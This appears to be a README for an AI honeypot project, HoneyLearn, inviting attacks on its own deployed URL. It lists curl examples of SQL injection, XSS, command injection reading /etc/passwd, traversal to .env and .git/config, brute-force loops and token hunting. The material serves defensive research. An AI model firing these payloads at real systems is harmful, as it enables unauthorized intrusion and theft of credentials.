# 🎯 How to Attack HoneyLearn

**Welcome, attacker!** You are _explicitly invited_ to attack this honeypot. HoneyLearn is an AI-powered honeypot that **learns from your attacks in real-time** — every payload you send makes the AI smarter.

## 🔗 Live Target

> **Attack URL:** `https://honeylearn.onrender.com`  
> _(Replace with actual deployed URL)_

## ⚔️ What to Try

HoneyLearn monitors and classifies **7 attack categories**. Try them all:

### 1. SQL Injection 💉
```bash
curl -X POST https://honeylearn.onrender.com/login \
  -d "username=admin&password=' OR 1=1 --"

curl "https://honeylearn.onrender.com/search?q=1 UNION SELECT username,password FROM users--"
```

### 2. Cross-Site Scripting (XSS) ⚡
```bash
curl -X POST https://honeylearn.onrender.com/comment \
  -d "body=<script>alert('XSS')</script>"

curl "https://honeylearn.onrender.com/search?q=<img src=x onerror=alert(1)>"
```

### 3. Remote Code Execution (RCE) 💀
```bash
curl -X POST https://honeylearn.onrender.com/api/ping \
  -d "host=127.0.0.1; cat /etc/passwd"

curl -X POST https://honeylearn.onrender.com/debug \
  -d "__import__('os').system('id')"
```

### 4. Brute Force 🔨
```bash
# Try multiple login attempts
for pw in admin password 123456 letmein qwerty; do
  curl -X POST https://honeylearn.onrender.com/admin-login \
    -d "username=admin&password=$pw"
done
```

### 5. Directory Traversal 📁
```bash
curl "https://honeylearn.onrender.com/download?file=../../etc/passwd"
curl "https://honeylearn.onrender.com/.env"
curl "https://honeylearn.onrender.com/.git/config"
curl "https://honeylearn.onrender.com/backup.zip"
```

### 6. Bot Scanner 🤖
```bash
# Scan with typical scanner user-agents
curl -H "User-Agent: sqlmap/1.5.2" https://honeylearn.onrender.com/wp-admin
curl -H "User-Agent: Nikto/2.1.6" https://honeylearn.onrender.com/phpmyadmin
curl -H "User-Agent: Nmap NSE" https://honeylearn.onrender.com/actuator/health
```

### 7. Credential Stuffing 🔑
```bash
curl -X POST https://honeylearn.onrender.com/api/auth/login \
  -d "email=user@leaked.com&password=leaked_pass123"
```

### 🍯 Bonus: Honeytoken Hunting
```bash
# Visit the fake admin page and look for hidden tokens in the HTML source
curl -s https://honeylearn.onrender.com/admin-login | grep -i "key\|jwt\|token"
# Then try using what you find...
```

## 📋 Rules of Engagement

1. ✅ **You are explicitly invited** to attack the target URL above
2. ✅ Try any attack technique — SQL injection, XSS, RCE, brute force, etc.
3. ✅ Use any tools — `curl`, `sqlmap`, `nikto`, `burp`, custom scripts
4. ✅ Be creative! Novel attacks help the AI learn faster
5. ❌ **Do NOT** attack any other systems or infrastructure
6. ❌ **Do NOT** attempt actual denial-of-service (rate limit yourself)
7. ❌ **Do NOT** try to access the admin dashboard

## 🧠 What Happens to Your Attacks

1. Every request you send is **classified** by the AI (SQL injection, XSS, RCE, etc.)
2. Your attack patterns are **fingerprinted** and tracked across sessions
3. Novel patterns are **ingested** into the learning buffer
4. When enough samples collect, the AI **retrains itself** with your real-world data
5. The classifier gets **smarter** with every attack wave

## 🤝 Contributing Code

If you want to contribute to the codebase:
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## ⚖️ Legal Disclaimer

By attacking the HoneyLearn instance, you acknowledge:
- This is a **controlled, intentional honeypot** deployed for research
- You have **explicit permission** from the owner to send attack traffic
- You will **only target** the specified URL
- This activity is for **educational and research purposes only**
